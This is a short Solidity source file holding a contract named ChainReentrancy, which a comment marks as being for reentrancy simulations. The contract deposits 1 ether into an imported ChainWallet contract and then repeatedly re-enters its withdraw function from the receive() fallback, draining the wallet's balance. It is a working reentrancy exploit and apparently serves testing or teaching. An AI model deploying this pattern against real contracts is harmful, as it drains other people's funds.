// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "./ChainWallet.sol";

// TODO: This is for reentrency simulations
contract ChainReentrancy {
    ChainWallet public chainWallet;

    constructor(address _chainWalletAddress) {
        chainWallet = ChainWallet(_chainWalletAddress);
    }

    receive() external payable {
        if (address(chainWallet).balance >= 1 ether) {
            chainWallet.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Require 1 Ether to attack");
        chainWallet.deposit{value: 1 ether}();
        chainWallet.withdraw();
    }

    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
